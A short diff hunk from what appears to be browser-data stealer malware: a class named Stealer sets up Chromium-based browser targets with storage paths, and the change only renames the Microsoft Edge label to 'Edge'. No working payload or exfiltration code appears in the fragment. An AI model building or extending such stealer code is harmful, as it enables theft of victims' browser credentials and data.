@@ -57,7 +57,7 @@ class Stealer(Thread):
             },
             {
                 "object": Chromium(
-                    "Microsoft Edge",
+                    "Edge",
                     self.config.StoragePath,
                     *self.config.MicrosoftEdgePaths,
                     browser_functions,
